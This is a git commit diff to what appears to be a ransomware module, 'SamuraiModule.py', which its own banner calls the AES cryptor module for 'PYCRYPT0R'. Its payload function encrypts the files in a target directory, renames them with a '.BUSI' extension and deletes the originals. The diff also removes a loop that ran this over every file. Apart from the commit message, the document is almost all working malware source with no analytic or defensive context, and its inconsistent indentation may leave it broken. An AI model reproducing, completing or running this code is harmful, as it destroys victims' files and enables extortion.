43fce735434e0c0d7e1606acb8af8ac2720f2c27
Aleksey <sidorenkoalekse@mail.ru>
2018-12-07 19:06:09 +0700

    Update and rename CryptorModule.py to SamuraiModule.py

--- SamuraiModule.py
+++ SamuraiModule.py
@@ -1,3 +1,6 @@
+#!/usr/bin/python
+# Samurai
+
 import os, random, struct, hashlib
 from Crypto.Cipher import AES
 
@@ -16,7 +19,7 @@ def print_banner():
 	 /        \ / __ \_|  Y Y  \|  |  / |  | \/ / __ \_|  |
 	/_______  /(____  /|__|_|  /|____/  |__|   (____  /|__|
         	\/      \/       \/                     \/
-			    DESKTOP VERSION
+		THIS AES IS CRYPTOR MODULE FOR PYCRYPT0R
 	'''
 	print(banner)
 
@@ -41,35 +44,30 @@ def get_system():
 
 
 def payload(key, in_filename, out_filename=None, chunksize=64*1024):
-
+	
 	if not out_filename:
-        	out_filename = in_filename + '.BUSI'
+		out_filename = in_filename + '.BUSI'
 
 	iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
-    	encryptor = AES.new(key, AES.MODE_CBC, iv)
-    	#filesize = os.path.getsize(in_filename)
+	encryptor = AES.new(key, AES.MODE_CBC, iv)
+	#filesize = os.path.getsize(in_filename)
 	filesize = os.path.getsize(SYS_INFO["PATH"] + in_filename)
-	
+
 	#with open(SYS_INFO["PATH"] + in_filename, 'rb') as infile:
 	try:
-	    	with open(SYS_INFO["PATH"] + in_filename, 'rb') as infile:
-	       		with open(SYS_INFO["PATH"] + out_filename, 'wb') as outfile:
-		    		outfile.write(struct.pack('<Q', filesize))
-		  		outfile.write(iv)
+		with open(SYS_INFO["PATH"] + in_filename, 'rb') as infile:
+		       	with open(SYS_INFO["PATH"] + out_filename, 'wb') as outfile:
+			    	outfile.write(struct.pack('<Q', filesize))
+			  	outfile.write(iv)
 
-		    		while True:
-		        		chunk = infile.read(chunksize)
-		        		if len(chunk) == 0:
-		            			break
-		        		elif len(chunk) % 16 != 0:
-		            			chunk += ' ' * (16 - len(chunk) % 16)
+			    	while True:
+					chunk = infile.read(chunksize)
+					if len(chunk) == 0:
+				    		break
+					elif len(chunk) % 16 != 0:
+				    		chunk += ' ' * (16 - len(chunk) % 16)
 
-		        	outfile.write(encryptor.encrypt(chunk))
-		os.remove(SYS_INFO["PATH"] + in_filename)
+					outfile.write(encryptor.encrypt(chunk))
+			os.remove(SYS_INFO["PATH"] + in_filename)
 	except IOError:
 		pass
-
-
-get_system()
-for file in os.listdir(SYS_INFO["PATH"]):
-	payload(KEY, file)
